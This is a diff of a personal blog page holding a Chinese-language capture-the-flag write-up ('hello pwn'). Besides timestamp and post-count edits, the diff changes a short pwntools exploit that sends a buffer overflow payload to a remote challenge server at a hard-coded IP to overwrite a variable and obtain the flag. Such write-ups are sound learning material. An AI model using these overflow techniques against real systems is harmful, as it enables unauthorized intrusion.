@@ -34,7 +34,7 @@
 <meta property="og:image" content="http://example.com/2020/12/18/AD-hello-pwn/4.png">
 <meta property="og:image" content="http://example.com/2020/12/18/AD-hello-pwn/5.png">
 <meta property="article:published_time" content="2020-12-18T10:54:01.000Z">
-<meta property="article:modified_time" content="2020-12-19T07:51:47.851Z">
+<meta property="article:modified_time" content="2020-12-19T11:59:23.578Z">
 <meta property="article:author" content="带废物">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -133,7 +133,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">17</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">19</span></a>
 
   </li>
   </ul>
@@ -194,7 +194,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-12-19 15:51:47" itemprop="dateModified" datetime="2020-12-19T15:51:47+08:00">2020-12-19</time>
+                <time title="Modified: 2020-12-19 19:59:23" itemprop="dateModified" datetime="2020-12-19T19:59:23+08:00">2020-12-19</time>
               </span>
 
           
@@ -241,7 +241,7 @@
 <p>双击&amp;unk_601068和dword_60106C，IDA跳转到另一页面（IDA开始香了）<br><img src="/2020/12/18/AD-hello-pwn/4.png" class></p>
 <p>双击sub_400686()，跳转到：<br><img src="/2020/12/18/AD-hello-pwn/5.png" class><br>芜湖起飞</p>
 <p>也就是说只要dword_60106C=1853186401，就能拿到flag</p>
-<p>现在我能读懂脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>) <span class="comment">#&#x27;a&#x27;*4代表偏移四个字节，p64()是pwntools工具，打包数据，64位</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>) <span class="comment">#读取代码直到这个位置</span></span><br><span class="line">io.sendline(payload) </span><br><span class="line"><span class="comment">#发送数据，写入到&amp;unk_601068，但我们的数据使它偏移了4个字节，到了dword_60106C，写入数据</span></span><br><span class="line">io.interactive() <span class="comment">#将控制权交给用户</span></span><br></pre></td></tr></table></figure></p>
+<p>现在再看脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>) <span class="comment">#&#x27;a&#x27;*4代表偏移四个字节，p64()是pwntools工具，打包数据，64位</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;lets get hello world for bof&quot;</span>) <span class="comment">#读取代码直到这个位置</span></span><br><span class="line">io.sendline(payload) </span><br><span class="line"><span class="comment">#发送数据，写入到&amp;unk_601068，但我的数据使它偏移了4个字节，到了dword_60106C，写入数据</span></span><br><span class="line">io.interactive() <span class="comment">#将控制权交给用户</span></span><br></pre></td></tr></table></figure></p>
 <p>没有人比我更懂速成</p>
 
     </div>
@@ -340,7 +340,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
